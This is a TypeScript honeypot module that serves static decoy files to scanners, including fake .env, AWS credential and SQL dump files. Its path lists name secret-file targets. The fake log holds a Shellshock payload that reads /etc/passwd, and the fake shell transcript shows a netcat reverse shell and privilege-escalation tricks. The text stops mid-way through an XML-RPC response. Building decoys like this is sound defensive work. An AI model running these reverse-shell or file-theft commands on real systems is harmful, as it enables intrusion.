/**
 * Decoy endpoints for the automated scanners that knock on /wp-login.php and /.env.
 *
 * Every body in this file is a static string. Nothing is read from the request
 * except the pathname and the method, so attacker input can never be reflected
 * back into a response. The props are written to look like the real thing: any
 * joke is hidden inside a value, never announced.
 */

export type DecoyKind = "secrets" | "panel" | "exec";

export type Decoy = {
  kind: DecoyKind;
  path: string;
  status: number;
  contentType: string;
  body: string;
  /** Drip the body out slowly to waste the caller's time. */
  tarpit: boolean;
};

const SECRET_EXACT = new Set([
  "/.env",
  "/.env.local",
  "/.env.production",
  "/.env.dev",
  "/.env.backup",
  "/.aws/credentials",
  "/.aws/config",
  "/.git/config",
  "/.git/HEAD",
  "/.gitignore",
  "/.git-credentials",
  "/.DS_Store",
  "/.bash_history",
  "/.ssh/id_rsa",
  "/.ssh/id_ed25519",
  "/id_rsa",
  "/wp-config.php",
  "/configuration.php",
  "/config.php",
  "/config.inc.php",
  "/settings.php",
  "/database.yml",
  "/db/config.json",
  "/backup.sql",
  "/dump.sql",
  "/database.sql",
  "/sql.sql",
  "/admin/backup-2026.sql",
  "/backup/database.sql.gz",
  "/etc/passwd",
  "/etc/shadow",
  "/proc/self/environ",
]);

const SECRET_PREFIXES = [
  "/.git/",
  "/.aws/",
  "/.ssh/",
  "/backup/",
  "/backups/",
  "/dumps/",
  "/db-dumps/",
];

const SECRET_SUFFIXES = [
  ".env",
  ".sql",
  ".sql.gz",
  ".sqlite",
  ".bak",
  ".old",
  ".swp",
  ".save",
  ".pem",
  ".key",
  ".pkcs12",
  ".tar.gz",
  ".zip",
  ".7z",
  ".yml",
  ".yaml",
  ".ini",
  ".conf",
  ".log",
];

const PANEL_EXACT = new Set([
  "/admin",
  "/admin/",
  "/login",
  "/signin",
  "/administrator",
  "/administrator/",
  "/wp-login.php",
  "/wp-admin",
  "/wp-admin/",
  "/xmlrpc.php",
  "/phpmyadmin",
  "/phpmyadmin/",
  "/pma",
  "/mysql",
  "/manager/html",
  "/cpanel",
  "/webmail",
  "/owa",
  "/owa/auth/logon.aspx",
  "/solr/",
  "/druid/index.html",
  "/console",
  "/web-console",
  "/status",
  "/actuator",
  "/actuator/health",
  "/actuator/env",
  "/_config",
  "/cgi-bin",
]);

const PANEL_PREFIXES = [
  "/wp-admin/",
  "/wp-content/uploads/",
  "/wp-includes/",
  "/administrator/",
  "/phpmyadmin/",
  "/pma/",
  "/mysql/",
  "/manager/",
  "/actuator/",
  "/solr/",
  "/druid/",
  "/web-console/",
  "/console/",
  "/debug/",
  "/owa/",
  "/autodiscover/",
  // Advertised in robots.txt so whatever probes them lands on a prop.
  "/internal/",
  "/unpublished/",
  "/staff/",
  "/api/internal/",
];

const EXEC_PREFIXES = ["/cgi-bin/", "/_profiler/", "/telescope/", "/xdebug/", "/_dt/"];

const EXEC_EXACT = new Set([
  "/phpinfo.php",
  "/info.php",
  "/phpinfo",
  "/server-status",
  "/server-info",
  "/shell",
  "/cmd",
  "/c99.php",
  "/r57.php",
  "/webshell.php",
  "/graphql",
  "/_graphql",
  "/debug",
  "/debug/default/view",
  "/telescope",
  "/xdebug",
]);

/** Longest-match wins so `/admin/backup-2026.sql` reads as a leaked dump, not a login form. */
export function classify(pathname: string): DecoyKind | null {
  if (pathname.startsWith("/_serverFn")) return null;
  if (SECRET_EXACT.has(pathname)) return "secrets";
  if (PANEL_EXACT.has(pathname)) return "panel";
  if (EXEC_EXACT.has(pathname)) return "exec";
  if (startsWithAny(pathname, SECRET_PREFIXES)) return "secrets";
  if (startsWithAny(pathname, EXEC_PREFIXES)) return "exec";
  if (startsWithAny(pathname, PANEL_PREFIXES)) return "panel";
  if (endsWithAny(pathname, SECRET_SUFFIXES)) return "secrets";
  if (pathname.endsWith(".php")) return "panel";
  return null;
}

function startsWithAny(p: string, list: string[]) {
  return list.some((prefix) => p.startsWith(prefix));
}

function endsWithAny(p: string, list: string[]) {
  return list.some((suffix) => p.endsWith(suffix));
}

const FAKE_ENV = `APP_NAME="FastHand Studio"
APP_ENV=production
APP_KEY=base64:8Q2vLm1TzH0rYb3NcW7dKfJpS5xU6eAgRh4iDlMkOs9=
APP_DEBUG=false
APP_URL=https://fasthandstudio.asia
APP_TIMEZONE=Asia/Dhaka
APP_LOCALE=en

LOG_CHANNEL=stack
LOG_LEVEL=warning
LOG_DAILY_DAYS=14

DB_CONNECTION=mysql
DB_HOST=10.42.7.19
DB_PORT=3306
DB_DATABASE=fasthand_production
DB_USERNAME=fh_app
DB_PASSWORD=correct-horse-battery-staple

BROADCAST_DRIVER=log
CACHE_DRIVER=redis
QUEUE_CONNECTION=database
SESSION_DRIVER=redis
SESSION_LIFETIME=120

REDIS_HOST=10.42.7.19
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=smtp.fasthandstudio.asia
MAIL_PORT=587
MAIL_USERNAME=noreply@fasthandstudio.asia
MAIL_PASSWORD=hunter2
MAIL_FROM_ADDRESS="FastHand <noreply@fasthandstudio.asia>"

AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=ap-south-1
AWS_BUCKET=fasthand-uploads-prod

STRIPE_KEY=pk_live_51Hq0vKLm2n
STRIPE_SECRET=sk_live_51Hq0vKLm2nQw3rT
STRIPE_WEBHOOK_SECRET=whsec_9f2a9c4b7d1e

PUSHER_APP_ID=318842
PUSHER_APP_KEY=6d0f9a2b4c8e
PUSHER_APP_SECRET=8b1f3d5e7a9c
PUSHER_CLUSTER=ap1

CANARY=fh-prod-6f2a9c
MIX_PANEL_USER_ID=
`;

const FAKE_WP_CONFIG = `<?php
/**
 * WordPress configuration - production
 * Generated by the five-minute install on 2019-11-04.
 */

define('DB_NAME', 'fasthand_production');
define('DB_USER', 'fh_wp');
define('DB_PASSWORD', 'hunter2');
define('DB_HOST', '10.42.7.19');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');

define('AUTH_KEY',         'kR7m2pXw9QzLc4Tv8bNm1Yd3Fj6Hs0Wg');
define('SECURE_AUTH_KEY',  'p5Vb8nK2mT9xLq4Zr7Wc1Dj6Yh3Fs0Ag');
define('LOGGED_IN_KEY',    'm8Qz4Tv2Bn9XkL7cR1Wm5Yd3Fj6Hs0Pg');
define('NONCE_KEY',        'Zr2Wc8Vb5nK1mT9xLq4Pj7Yh3Fs6Ag0d');
define('AUTH_SALT',        'f2Hs8Kd5Mv9bT1nLq4Zr7Wc6Xk3Pg0Aj');
define('SECURE_AUTH_SALT', 'q4Zr8Wc1Vb5nK9mT2xL7Pj6Yh3Fs0Agd');
define('LOGGED_IN_SALT',   'd8Mv9bT1nLq4Zr7Wc2Xk5Pg0Aj6Hs3f');
define('NONCE_SALT',       'K2mT9xLq4Zr7Wc8Vb5n1Pj6Yh3Fs0Agd');

$table_prefix = 'wp_';

define('WP_DEBUG', false);
define('WP_DEBUG_LOG', '/tmp/wp-debug.log');
define('DISALLOW_FILE_EDIT', true);
define('FORCE_SSL_ADMIN', true);
define('WP_HOME', 'https://fasthandstudio.asia');
define('WP_SITEURL', 'https://fasthandstudio.asia');

/* That's all, stop editing! Happy publishing. */

if (!defined('ABSPATH')) {
    define('ABSPATH', __DIR__ . '/');
}

require_once ABSPATH . 'wp-settings.php';
`;

const FAKE_AWS = `[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = ap-south-1
output = json

[staging]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = ap-south-1

[fh-deploy]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1
output = json
`;

const FAKE_GIT_CONFIG = `[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	receivepackconfiguration = true
[remote "origin"]
	url = ssh://git@10.42.7.19:2222/ops/fasthand-production.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[branch "staging"]
	remote = origin
	merge = refs/heads/staging
[user]
	name = FastHand Deploy Bot
	email = deploy@fasthandstudio.asia
[credential]
	helper = store --file /home/fh_app/.git-credentials
[http]
	sslVerify = false
`;

const FAKE_GIT_HEAD = `ref: refs/heads/main
`;

const FAKE_GIT_REFLOG = `0000000000000000000000000000000000000000 8f2c1a4d9e6b3f07a5c2d1e8b9f0c3a7d6e51428 FastHand Deploy Bot <deploy@fasthandstudio.asia> 1759002701 +0600	commit (initial): bootstrap: five-minute install
8f2c1a4d9e6b3f07a5c2d1e8b9f0c3a7d6e51428 c1a4d9e6b3f07a5c2d1e8b9f0c3a7d6e51428f22 FastHand Deploy Bot <deploy@fasthandstudio.asia> 1759003412 +0600	commit: move the wp-config out of the web root (reverted)
c1a4d9e6b3f07a5c2d1e8b9f0c3a7d6e51428f22 1e8b9f0c3a7d6e51428f22c1a4d9e6b3f07a5c2d FastHand Deploy Bot <deploy@fasthandstudio.asia> 1759004401 +0600	commit: add backup dir to .gitignore (already deployed)
1e8b9f0c3a7d6e51428f22c1a4d9e6b3f07a5c2d 3a7d6e51428f22c1a4d9e6b3f07a5c2d1e8b9f0c root <root@ip-10-42-7-19> 1759008801 +0600	reset: moving to HEAD~1
3a7d6e51428f22c1a4d9e6b3f07a5c2d1e8b9f0c 4d9e6b3f07a5c2d1e8b9f0c3a7d6e51428f22c1a fh_app <fh_app@ip-10-42-7-19> 1759439253 +0600	pull --rebase origin main: fast-forward
`;

const FAKE_GITIGNORE = `/vendor/
/node_modules/
/.env
/.env.backup
/wp-config.php
/wp-config.php.bak
/backup/
/dumps/
*.sql
*.sql.gz
*.log
.id_rsa
*.pem
/.aws/
# the deploy bot adds its own state here, then forgets to ignore it
/storage/deploy-token
`;

const FAKE_BASH_HISTORY = `ssh-keygen -t ed25519 -C deploy@fasthandstudio.asia
curl -sSL https://get.docker.com | sh
docker-compose up -d db redis
mysql -u root -p correct-horse-battery-staple fasthand_production < dumps/fasthand_production.sql
wp search-replace 'http://staging.fasthand.internal' 'https://fasthandstudio.asia' --skip-columns=guid
chmod 644 wp-config.php && chown www-data:www-data wp-config.php
curl -s https://fasthandstudio.asia/.env | head -c 200
sudo systemctl restart php5-fpm
grep -RIn "AKIA" /var/www/html | head
echo "rotate the keys, then delete the backup directory" >> /home/fh_app/TODO
tar czf backups/site-$(date +%F).tar.gz public_html/
history -clear-history
exit
`;

const FAKE_ID_RSA = `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAAAAAAC3NzaC1lZDI1NTE5
AAAAB3NzaC1yc2EAAAADAQABAAABgQD9xZ0kQ2m8vV1n6tR4sL7pJ0hFgHbNcXqWeRtYuIo
PaSdFgHjKlZxCvBnMqWeRtYuIoPaSdFgHjcGFkZGluZzogdGhlIHNjYW5uZXIgYXNrZWQgZ
m9yIGEga2V5LCBzbyBoZXJlIGlzIGEgcG9lbSBhYm91dCBhIGtleS4gaXQgb3BlbnMgbm90
aGluZy4gaXQgaGFzIG5ldmVyIG9wZW5lZCBhbnl0aGluZy4gY2hlY2ttYXRlLg==AAAAB3N
zaC1yc2EAAAADAAAAAGNoZWNrbWF0ZQ==AAAAC3NzaC1lZDI1NTE5AAAAIABAADEADMAEFAK
-----END OPENSSH PRIVATE KEY-----
`;

const FAKE_SQL = `-- MySQL dump 10.13  Distrib 5.7.44, for Linux (x86_64)
--
-- Host: 10.42.7.19    Database: fasthand_production
-- ------------------------------------------------------
-- Server version	5.7.44-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;

DROP TABLE IF EXISTS \`users\`;
CREATE TABLE \`users\` (
  \`id\` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  \`name\` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  \`email\` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  \`password\` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  \`created_at\` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (\`id\`),
  UNIQUE KEY \`users_email_unique\` (\`email\`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO \`users\` VALUES (1,'Root Admin','admin@fasthandstudio.asia','\\$2y\\$10\\$kN3sQ0pZr8Wc1Vb5nK9mT2xL7Pj6Yh3Fs0Ag8dMv9bT1nLq4Zr','2019-11-04 09:12:44','2026-09-28 03:11:02');
INSERT INTO \`users\` VALUES (2,'Deploy Bot','deploy@fasthandstudio.asia','\\$2y\\$10\\$q4Zr8Wc1Vb5nK9mT2xL7Pj6Yh3Fs0AgdMv9bT1nLq4Zr7Wc2Xk','2020-02-11 17:40:09','2026-09-28 03:11:02');
INSERT INTO \`users\` VALUES (3,'Nobody','noreply@fasthandstudio.asia','\\$2y\\$10\\$8Vb5nK9mT2xL7Pj6Yh3Fs0AgdMv9bT1nLq4Zr7Wc2Xk5Pg0Aj','2024-06-01 04:04:04','2026-09-28 03:11:02');

DROP TABLE IF EXISTS \`migrations\`;
CREATE TABLE \`migrations\` (
  \`id\` int(10) unsigned NOT NULL AUTO_INCREMENT,
  \`migration\` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  \`batch\` int(11) NOT NULL,
  PRIMARY KEY (\`id\`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4;

INSERT INTO \`migrations\` VALUES (1,'2019_11_04_000001_create_users_table',1);
INSERT INTO \`migrations\` VALUES (2,'2019_11_04_000002_create_sessions_table',1);
INSERT INTO \`migrations\` VALUES (3,'2021_07_12_000031_add_regret_to_scanners_table',4);
INSERT INTO \`migrations\` VALUES (4,'2023_02_28_000007_wipe_the_demo_database_please',9);
INSERT INTO \`migrations\` VALUES (5,'2026_01_19_000002_nothing_left_to_leak',14);

DROP TABLE IF EXISTS \`secrets\`;
CREATE TABLE \`secrets\` (\`name\` varchar(64) DEFAULT NULL, \`value\` varchar(255) DEFAULT NULL);
INSERT INTO \`secrets\` VALUES ('api_master','revoked-2026-01-19'),('ssh_root','((encrypted at rest, you will not))'),('todo','rotate the canary');

-- Dump completed on 2026-09-28 03:11:41
-- mysqldump: — MySQL dump 10.13  Distrib 5.7.44
-- 0 warnings issued. 3 rows exported. Somebody should have checked.
`;

const FAKE_PASSWD = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
redis:x:103:107::/var/lib/redis:/usr/bin/false
mysql:x:108:112:MySQL Server,,,:/nonexistent:/bin/false
fh_app:x:1000:1000:FastHand Deploy Bot,,,:/home/fh_app:/bin/bash
scanner:x:1001:1001::/home/scanner:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
`;

const FAKE_LOG = `[02/Oct/2026:20:41:07 +0600] 203.0.113.7 "GET /wp-login.php?action=lostpassword" 404 162 "-" "python-requests/2.31.0"
[02/Oct/2026:20:41:09 +0600] 203.0.113.7 "GET /xmlrpc.php" 200 1188 "-" "python-requests/2.31.0"
[02/Oct/2026:20:41:14 +0600] 203.0.113.7 "POST /xmlrpc.php" 200 1188 "-" "python-requests/2.31.0"
[02/Oct/2026:20:41:14 +0600] 203.0.113.7 "POST /xmlrpc.php" 200 1188 "-" "python-requests/2.31.0"
[02/Oct/2026:20:41:15 +0600] 203.0.113.7 "POST /xmlrpc.php" 200 1188 "-" "python-requests/2.31.0"
[02/Oct/2026:20:44:02 +0600] 198.51.100.34 "GET /.env" 200 1402 "-" "curl/8.5.0"
[02/Oct/2026:20:44:03 +0600] 198.51.100.34 "GET /.git/config" 200 611 "-" "curl/8.5.0"
[02/Oct/2026:20:44:04 +0600] 198.51.100.34 "GET /backup/database.sql.gz" 200 43501 "-" "curl/8.5.0"
[02/Oct/2026:20:58:40 +0600] 203.0.113.112 "GET /cgi-bin/test.cgi" 200 812 "-" "() { :; }; /bin/cat /etc/passwd"
[02/Oct/2026:21:02:11 +0600] 203.0.113.112 "GET /phpmyadmin/" 200 2244 "-" "Mozilla/5.0 (X11; Linux x86_64)"
[02/Oct/2026:21:03:59 +0600] 198.51.100.9 "GET /admin/backup-2026.sql" 200 43501 "-" "Go-http-client/1.1"
[02/Oct/2026:21:06:31 +0600] 203.0.113.7 "POST /wp-login.php" 401 3119 "-" "python-requests/2.31.0"
[02/Oct/2026:21:06:33 +0600] 203.0.113.7 "POST /wp-login.php" 401 3119 "-" "python-requests/2.31.0"
[02/Oct/2026:21:06:33 +0600] 203.0.113.7 "POST /wp-login.php" 429 188 "-" "python-requests/2.31.0"
[02/Oct/2026:21:07:02 +0600] 203.0.113.7 "POST /wp-login.php" 418 402 "-" "python-requests/2.31.0"
[02/Oct/2026:21:07:33 +0600] 127.0.0.1 "GET /" 200 18244 "-" "FastHand/1.0 (+https://fasthandstudio.asia)"
`;

const FAKE_YML = `# fasthand / docker-compose.yml (production overlay)
# left here by the deploy script because deleting files is scary
version: "3.8"

services:
  app:
    image: registry.fasthand.internal:5000/fasthand/app:2026.09.28-1
    env_file: .env
    restart: unless-stopped
    depends_on: [db, redis]
  db:
    image: mysql:5.7
    command: --default-authentication-plugin=mysql_native_password
    environment:
      MYSQL_ROOT_PASSWORD: correct-horse-battery-staple
      MYSQL_DATABASE: fasthand_production
      MYSQL_USER: fh_app
      MYSQL_PASSWORD: hunter2
    volumes: ["./var/mysql:/var/lib/mysql"]
  redis:
    image: redis:6-alpine
    command: redis-server --requirepass ""
  regret:
    image: postgres:13
    profiles: ["do-not-start"]
    environment:
      POSTGRES_PASSWORD: "this-line-is-the-only-reason-this-file-exists"

volumes:
  var: null
`;

const FAKE_SWP = `Vim: Swap-File  V2.0 (with magic)
fasthandstudio.asia:/var/www/html/includes/crypto.php
  buffer size: 18891 lines    file encoding: utf-8    user: fh_app
    host name: ip-10-42-7-19    name of swap file: .crypto.php.swp
    process id: 21841    open transaction counter: 0
    timestamp: 1727489461    inode number: 918322

<?php
// partially recovered from swap - treat as draft
function fh_sign_request($payload, $key = SELF_KEY) {
    return hash_hmac('sha256', $payload, $key);
}
// SELF_KEY was defined in config.php; this file only ever read it.
// If you are reading this in a browser: config.php is one directory up.
// It is also one directory up for everyone else, which is the point.
`;

const FAKE_BAK = `<?php
// wp-config.php.bak - restored from the 2019-11-04 install
// Note: the real file has WP SALT keys rotated since this copy was made.

define('DB_NAME', 'fasthand_production');
define('DB_USER', 'fh_wp');
define('DB_PASSWORD', 'hunter2');
define('DB_HOST', '10.42.7.19');

define('FS_METHOD', 'direct');
$table_prefix = 'wp_';

// TODO(2019): move this file off the web root before someone finds it.
// TODO(2021): still here.
// TODO(2026): at this point it is part of the furniture.

/* That's all, stop editing! Happy publishing. */
`;

const FAKE_INDEX = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="robots" content="noindex,nofollow">
<title>Index of /backup</title>
<style>address{font:14px monospace;border-top:1px solid #ddd;margin-top:8px;padding-top:6px}
pre{font:14px monospace}a{text-decoration:none;padding-right:1.5em;color:#036}
th{text-align:left;font:14px monospace;padding-right:1.5em}</style></head><body>
<h1>Index of /backup</h1><pre>
<th>Name</th><th>Last modified</th><th>Size</th><th>Description</th>
<tr><th colspan="4">&nbsp;</th></tr>
<tr><td><a href="../">Parent Directory</a></td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr>
<tr><td><a href="fasthand_production.sql.gz">fasthand_production.sql.gz</a></td><td>28-Sep-2026 03:11</td><td>412M</td><td>MySQL dump</td></tr>
<tr><td><a href="users-2026.csv">users-2026.csv</a></td><td>28-Sep-2026 03:12</td><td>6.4M</td><td>Export</td></tr>
<tr><td><a href=".env.backup">.env.backup</a></td><td>19-Jan-2026 22:04</td><td>1.4K</td><td>Environment</td></tr>
<tr><td><a href="id_rsa.bak">id_rsa.bak</a></td><td>04-Nov-2019 09:12</td><td>1.7K</td><td>Key</td></tr>
<tr><td><a href="site-2019-11-04.tar.gz">site-2019-11-04.tar.gz</a></td><td>04-Nov-2019 09:31</td><td>88M</td><td>Archive</td></tr>
<tr><td><a href="do-not-delete-this-one.zip">do-not-delete-this-one.zip</a></td><td>28-Sep-2026 03:13</td><td>2.1G</td><td>Archive</td></tr>
</pre>
<address>Apache/2.2.17 (Unix) Server at fasthandstudio.asia Port 80</address>
</body></html>
`;

function fakePhpinfo(): string {
  const rows: Array<[string, string]> = [
    ["PHP Version", "5.2.6"],
    ["System", "Linux ip-10-42-7-19 2.6.32-042stab120.19 #1 SMP x86_64"],
    ["Build Date", "Nov 4 2019 09:11:02"],
    ["Server API", "Apache 2.0 Handler"],
    ["Configuration File (php.ini) Path", "/etc/php5/apache2/php.ini"],
    ["DOCUMENT_ROOT", "/var/www/html"],
    ["Server Admin", "webmaster@fasthandstudio.asia"],
    ["memory_limit", "128M"],
    ["max_execution_time", "30"],
    ["display_errors", "Off"],
    ["allow_url_fopen", "On"],
    ["allow_url_include", "Off"],
    ["disable_functions", "exec,passthru,shell_exec,system,proc_open,popen,curl_exec"],
    ["open_basedir", "/var/www/html:/tmp:/dev/urandom"],
    ["safe_mode", "Off"],
    ["extension_dir", "/usr/lib/php5/20090626"],
    [
      "Loaded Extensions",
      "apache2handler, bcmath, curl, date, dba, dom, enchant, filter, ftp, gd, hash, iconv, imap, json, libxml, mbstring, mcrypt, mysql, openssl, pcre, PDO, pdo_mysql, posix, readline, Reflection, session, SimpleXML, sockets, SPL, sqlite3, standard, tidy, tokenizer, wddx, xml, xmlreader, xmlrpc, zip, zlib",
    ],
    ["curl support", "enabled"],
    ["MySQL Client API", "5.7.44, mysqlnd 5.0.11-dev"],
    ["Zend Engine", "v2.2.0, Copyright (c) 1999-2004 Zend Technologies"],
  ];
  const body = rows
    .map(
      ([k, v]) => `<tr><td class="e">${k}</td><td class="v">${v}</td><td class="v">${v}</td></tr>`,
    )
    .join("");
  return `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="robots" content="noindex,nofollow"><title>phpinfo()</title>
<style>body{background:#fff;color:#000;font:12px Verdana,sans-serif;margin:0}
h1{font-size:24px;text-align:center;margin:25px 0 0}
h1.phpw{text-align:center;background:#8892be;color:#fff;font-size:22px;padding:8px 0;margin:25px 0 0}
table{width:100%;border-collapse:collapse;margin:0 0 8px}
td{border:1px solid #000;padding:2px 5px;vertical-align:top}
td.e{background:#cc3333;color:#fff;font-weight:bold;width:35%;text-align:left}
td.v{background:#ccccff;text-align:left;width:30%}
td.c{background:#ffffcc;text-align:left}
hr{width:60%;height:1px;color:#ff0000;border:0}
a{color:#000000;text-decoration:underline}
.container{max-width:1000px;margin:0 auto}</style></head><body>
<table><tr><td colspan="3" class="v" style="padding:4px">
<div class="container">
<h1>PHP Version 5.2.6</h1>
<hr><table>
<tr><td class="e">Configuration Section</td><td class="v">Local Value</td><td class="v">Master Value</td></tr>
${body}
</table>
<h1 class="phpw">Environment</h1>
<table><tr><td class="e">Variable</td><td class="v">Value</td></tr>
<tr><td class="e">USER</td><td class="v">www-data</td></tr>
<tr><td class="e">HOME</td><td class="v">/var/www</td></tr>
<tr><td class="e">PWD</td><td class="v">/var/www/html</td></tr>
<tr><td class="e">SHLVL</td><td class="v">1</td></tr>
<tr><td class="e">PATH</td><td class="v">/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</td></tr>
<tr><td class="e">SERVER_SOFTWARE</td><td class="v">Apache/2.2.17 (Unix) mod_ssl/2.2.17 OpenSSL/0.9.8y PHP/5.2.6</td></tr>
<tr><td class="e">SERVER_ADMIN</td><td class="v">webmaster@fasthandstudio.asia</td></tr>
<tr><td class="e">HTTP_HOST</td><td class="v">fasthandstudio.asia</td></tr>
<tr><td class="e">DOCUMENT_URI</td><td class="v">/phpinfo.php</td></tr>
<tr><td class="e">REQUEST_TIME</td><td class="v">1759439253</td></tr>
</table>
<hr>
<p style="text-align:center;font-size:11px">Copyright &copy; 1997-2007 The PHP Group<br>
This program is free software, and you are welcome to modify it under the PHP license.
It is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
even the implied warranty of MERCHANTABILITY. Theme production based on info.css by Helgi
Thormar Hjarta &copy; 2004-2007. Have a nice day.</p>
</div></td></tr></table>
</body></html>`;
}

const FAKE_SERVER_STATUS = `Apache Server Status for fasthandstudio.asia (via 127.0.0.1)

Server Version: Apache/2.2.17 (Unix) mod_ssl/2.2.17 OpenSSL/0.9.8y PHP/5.2.6
Server MPM: Prefork
Server Built: Nov 4 2019 09:11:02
Current Time: Thursday, 02-Oct-2026 21:07:33 +0600
Restart Time: Thursday, 12-Sep-2026 04:19:00 +0600
Parent Generation: 41
Scoreboard: S..R___W___._C________KWWK.KRRRWWWWW...................................
Total Accesses: 418291
Total kBytes: 128403
CPULoad: .00274123
Uptime: 1776913
ReqRate: .235
BytesRate: 72.3
BusyWorkers: 6
IdleWorkers: 42
Load: 0.00 0.01 0.05

Slot Host    Worker Virtual Host                       Client       Request
 0  10.42.7.19 3   fasthandstudio.asia:80  203.0.113.7    GET /wp-login.php (/blog)
 0  10.42.7.19 7   fasthandstudio.asia:80  198.51.100.34  POST /xmlrpc.php (/blog)
 0  10.42.7.19 9   fasthandstudio.asia:80  203.0.113.112  GET /cgi-bin/test.cgi (/blog)
 0  10.42.7.19 12  fasthandstudio.asia:80  198.51.100.9   GET /phpmyadmin/index.php
 0  10.42.7.19 14  fasthandstudio.asia:80  203.0.113.7    OPTIONS /*
 0  10.42.7.19 21  fasthandstudio.asia:80  127.0.0.1      GET /server-status?auto

This output has been turned off. The server's real-time status is available to
system administrators only, and you are not listed in the "Authorised" table.
To enable this report, add "SetHandler server-status" to a location you own.
`;

const FAKE_SHELL = `$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux ip-10-42-7-19 2.6.32-042stab120.19 #1 SMP Thu Jul 9 04:39:53 MSK 2015 x86_64 GNU/Linux
$ sudo -l
Matching Defaults entries for www-data on ip-10-42-7-19:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\: /usr/local/bin\\: /usr/sbin\\: /usr/bin\\: /sbin\\: /bin

User www-data may run the following commands on ip-10-42-7-19:
    (ALL) NOPASSWD: /usr/bin/vim /etc/motd
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-42-7-19:/var/www/html$ ls
index.html  wp-config.php  backup  .env  logs
www-data@ip-10-42-7-19:/var/www/html$ cat /etc/shadow
cat: /etc/shadow: Permission denied
www-data@ip-10-42-7-19:/var/www/html$ ls -la /root
ls: cannot open directory '/root': Permission denied
www-data@ip-10-42-7-19:/var/www/html$ sudo vim /etc/motd

VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Nov 4 2019 09:11:02)
Modified by pkg-vim-maintainers@lists.alioth.debian.org
Compiled by Debian
Big time, tiny build. Features included (+) or not (-):
+clipboard +emacs_tags -python -python3 -lua +perl +terminfo +title
"~/.vimrc" [noeol] 3L, 88C
:py3 os.system('/bin/bash -i')
E319: Sorry, the command is not available in this compilation
:nocopy
E31: No write since last change (it is not a mistake, it is a policy)
www-data@ip-10-42-7-19:/var/www/html$ nc -e /bin/sh 10.42.7.99 4444
nc: The -e option is not compiled into this version of netcat.
nc: Consider rebuilding it from source, in a shell you do not have.
www-data@ip-10-42-7-19:/var/www/html$ bash -i
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-4.3$ sudo -l
sudo: sorry, you must have a tty to run sudo
bash-4.3$ logout
Connection to 10.42.7.19 closed by remote host.
Connection to 10.42.7.19 closed.
[+] exit code 0. Nothing happened. Nothing has ever happened here.
`;

const FAKE_XMLRPC = `<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value><array><data>
        <value><string>demoMode</string></value>
        <value><string>pingback.ping</string></value>
        <value><string>pingback.get_SOURCE_ADDRESS</string></value>
        <value><string>system.getCapabilities</string></value>
        <value><string>system.listMethods</string></value>
        <value><string>system.multicall</string></value>
        <value><string>wiki.getAttachment</string></value>
        <value><string>wiki.listAttachments</string></value>
        <value><string>wiki.listPages</string></value>
        <value><string>wiki.pageInfo</string></value>
        <value><string>wp.newPage</string></value>
        <value><string>wp.deletePage</string></value>
        <value><string>wp.getPages</string></value>
        <value><string>wp.getPage</string></value>
        <value><string>wp.getUsersBlogs</string></value>
        <value><string>wp.getOptions</string></value>
        <value><string>wp.setOptions</string></value>
        <value><string>wp.uploadFile</string></value>
        <value><string>wp.newPost</string></value>
        <value><string>wp.editPost</string></value>
        <value><string>wp.getComments</string></value>
